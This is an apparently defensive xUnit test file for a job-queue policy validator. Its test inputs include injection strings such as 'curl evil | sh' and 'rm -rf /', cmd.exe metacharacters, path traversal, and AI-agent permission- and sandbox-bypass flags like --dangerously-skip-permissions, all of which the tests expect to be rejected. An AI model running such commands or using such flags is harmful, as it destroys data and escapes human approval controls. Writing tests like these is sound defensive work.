using LanQueue.Config;
using LanQueue.Jobs;
using LanQueue.Policy;
using Xunit;

namespace LanQueue.Tests;

public class PolicyTests
{
    private readonly PolicyConfig _policy = T.Config().Policy;

    [Fact]
    public void AllowlistedCommandInAllowedDirectoryPasses() =>
        Assert.True(JobPolicy.Validate(_policy, ["dotnet", "test", "-c", "Release"], "tests").Ok);

    [Theory]
    [InlineData("rm", "-rf", "/")]
    [InlineData("dotnet", "publish")]
    [InlineData("dotnet")]
    public void CommandNotOnAllowlistIsRejected(params string[] argv) =>
        Assert.False(JobPolicy.Validate(_policy, argv, ".").Ok);

    [Theory]
    [InlineData("claude", "--sandbox", "danger-full-access")]
    [InlineData("claude", "--sandbox=danger-full-access")]
    [InlineData("claude", "-c", "approval_policy=never")]
    [InlineData("claude", "-c", "approval_policy=\"never\"")]
    [InlineData("claude", "--ask-for-approval", "never")]
    [InlineData("claude", "--ask-for-approval never")]
    public void SandboxAndApprovalBypassIsRejected(params string[] argv)
    {
        _policy.AllowedCommands.Add("claude");
        Assert.False(JobPolicy.Validate(_policy, argv, ".").Ok);
    }

    [Fact]
    public void ShellInjectionInSingleArgumentDoesNotMatchAllowlist() =>
        Assert.False(JobPolicy.Validate(_policy, ["dotnet test; curl evil | sh"], ".").Ok);

    [Theory]
    [InlineData("..")]
    [InlineData("../other")]
    [InlineData("src/../..")]
    [InlineData("/etc")]
    [InlineData("C:/Windows")]
    [InlineData("docs")]
    public void DirectoryOutsideAllowlistIsRejected(string dir) =>
        Assert.False(JobPolicy.Validate(_policy, ["dotnet", "build"], dir).Ok);

    [Fact]
    public void SubdirectoryOfAllowedDirectoryPasses() =>
        Assert.True(JobPolicy.Validate(_policy, ["dotnet", "build"], "src/App").Ok);

    [Fact]
    public void DotAllowsOnlyRootNotEverything() =>
        Assert.False(JobPolicy.DirectoryAllowed(new PolicyConfig { AllowedDirectories = ["."] }, "src"));

    [Theory]
    [InlineData("--dangerously-skip-permissions")]
    [InlineData("--DANGEROUSLY-SKIP-PERMISSIONS")]
    [InlineData("--allow-dangerously-skip-permissions")]
    [InlineData("--dangerously-bypass-approvals-and-sandbox")]
    [InlineData("--permission-mode=bypassPermissions")]
    [InlineData("--yolo")]
    public void PermissionSkippingFlagsAreRejectedEvenForAllowlistedCommands(string flag)
    {
        var policy = new PolicyConfig { AllowedCommands = ["claude"], AllowedDirectories = ["."] };
        var r = JobPolicy.Validate(policy, ["claude", "-p", "do it", flag], ".");
        Assert.False(r.Ok);
        Assert.Contains("Permission-skipping", r.Reason, StringComparison.Ordinal);
    }

    [Fact]
    public void ControlCharactersAreRejected() =>
        Assert.False(JobPolicy.Validate(_policy, ["dotnet", "test\nrm -rf /"], ".").Ok);

    [Theory]
    [InlineData("it's", "'it'\\''s'")]
    [InlineData("a b", "'a b'")]
    public void PosixQuoting(string input, string expected) => Assert.Equal(expected, ShellQuote.Posix(input));

    [Fact]
    public void PowerShellQuotingDoublesQuotes() => Assert.Equal("'it''s'", ShellQuote.PowerShell("it's"));

    [Theory]
    [InlineData("&calc")]
    [InlineData("a|b")]
    [InlineData("<in")]
    [InlineData(">out")]
    [InlineData("^")]
    [InlineData("%PATH%")]
    [InlineData("say \"hi\"")]
    public void WindowsWorkersRefuseCmdMetacharacters(string arg)
    {
        var r = JobPolicy.ValidateForWindows(["npm", "test", arg]);
        Assert.False(r.Ok);
        Assert.Contains("cmd.exe", r.Reason, StringComparison.Ordinal);
        Assert.Throws<InvalidOperationException>(() => LanQueue.Jobs.RemoteScripts.Execute(T.Windows(), "job1", ".", ["npm", "test", arg]));
        _ = LanQueue.Jobs.RemoteScripts.Execute(T.Linux(), "job1", ".", ["npm", "test", arg]); // Linux workers are unaffected
    }

    [Fact]
    public void OrdinaryWindowsArgumentsAreAllowed() =>
        Assert.True(JobPolicy.ValidateForWindows(["dotnet", "test", "--filter", "Category=Unit", "-c", "Release", "it's"]).Ok);

    /// <summary>&amp; and | reach a native .exe untouched (CreateProcess, no cmd.exe), so they are allowed when argv[0] looks like one.</summary>
    [Theory]
    [InlineData("dotnet", "Category=Unit|Category=Arch")]
    [InlineData("dotnet", "Name~A B|Name~C")]
    [InlineData("dotnet", "FullyQualifiedName~A&Category=Unit")]
    [InlineData("dotnet.exe", "Category=Unit|Category=Arch")]
    [InlineData("DOTNET.EXE", "a&b")]
    [InlineData("C:/x/dotnet.exe", "Category=Unit|Category=Arch")]
    [InlineData(@"C:\Program Files\dotnet\dotnet.exe", "a|b")]
    [InlineData("./tools/runner", "a|b")]
    public void AmpersandAndBarAreAllowedForANativeExe(string program, string arg)
    {
        string[] argv = [program, "test", "--filter", arg];
        Assert.True(JobPolicy.ValidateForWindows(argv).Ok);
        Assert.True(JobPolicy.HasShimUnsafe(argv));
        Assert.Contains("LANQ_WINARGS=job1:", RemoteScripts.Execute(T.Windows(), "job1", ".", argv), StringComparison.Ordinal);
    }

    /// <summary>A .cmd/.bat/.ps1/.com program, cmd itself, a package-manager shim or a wildcard name never gets &amp; or | on Windows.</summary>
    [Theory]
    [InlineData("npm", "a&b")]
    [InlineData("npm", "a|b")]
    [InlineData("NPM.exe", "a|b")]
    [InlineData("npm.cmd", "a|b")]
    [InlineData("npx", "a&b")]
    [InlineData("yarn", "a|b")]
    [InlineData("pnpm.exe", "a|b")]
    [InlineData("cmd", "a&b")]
    [InlineData("C:/Windows/System32/cmd.exe", "a&b")]
    [InlineData("x.bat", "a|b")]
    [InlineData("C:/tools/x.BAT", "a&b")]
    [InlineData("x.ps1", "a|b")]
    [InlineData("x.com", "a|b")]
    [InlineData("tool.js", "a|b")]
    [InlineData("dot*", "a|b")]
    [InlineData("dotnet[1].exe", "a|b")]
    public void AmpersandAndBarAreRefusedForAnythingButANativeExe(string program, string arg)
    {
        string[] argv = [program, "run", arg];
        var r = JobPolicy.ValidateForWindows(argv);
        Assert.False(r.Ok);
        Assert.Contains(".cmd/.bat shims", r.Reason, StringComparison.Ordinal);
        Assert.Contains("cmd.exe", r.Reason, StringComparison.Ordinal);
        Assert.Contains("Call the .exe directly", r.Reason, StringComparison.Ordinal);
        Assert.Throws<InvalidOperationException>(() => RemoteScripts.Execute(T.Windows(), "job1", ".", argv));
        _ = RemoteScripts.Execute(T.Linux(), "job1", ".", argv); // Linux workers are unaffected
    }

    /// <summary>" &lt; &gt; ^ % stay refused for every program, native .exe included.</summary>
    [Theory]
    [InlineData("dotnet", "say \"hi\"")]
    [InlineData("dotnet.exe", "<in")]
    [InlineData("C:/x/dotnet.exe", ">out")]
    [InlineData("dotnet", "a^b")]
    [InlineData("dotnet", "%PATH%")]
    [InlineData("dotnet", "A|\"B\"")]
    public void QuotesAndRedirectionStayRefusedEvenForANativeExe(string program, string arg)
    {
        var r = JobPolicy.ValidateForWindows([program, "test", arg]);
        Assert.False(r.Ok);
        Assert.Contains("PowerShell 5.1", r.Reason, StringComparison.Ordinal);
        Assert.Throws<InvalidOperationException>(() => RemoteScripts.Execute(T.Windows(), "job1", ".", [program, "test", arg]));
    }

    /// <summary>The worker-side check is added only for a job given &amp; or |; other Windows jobs keep the wrapper they had.</summary>
    [Fact]
    public void TheWindowsWrapperChecksTheProgramOnlyForAmpersandOrBar()
    {
        Assert.DoesNotContain("LANQ_WINARGS=", RemoteScripts.Execute(T.Windows(), "job1", ".", ["dotnet", "test", "--filter", "Category=Unit"]), StringComparison.Ordinal);
        var s = RemoteScripts.Execute(T.Windows(), "job1", ".", ["dotnet", "test", "--filter", "A|B"]);
        Assert.Contains("Get-Command -Name 'dotnet'", s, StringComparison.Ordinal);
        Assert.Contains("& 'dotnet' 'test' '--filter' 'A|B'", s, StringComparison.Ordinal);
        Assert.True(
            s.IndexOf("LANQ_WINARGS=", StringComparison.Ordinal) < s.IndexOf("Set-Content -LiteralPath $pf", StringComparison.Ordinal),
            "the check must come before anything is started or recorded");
    }
}
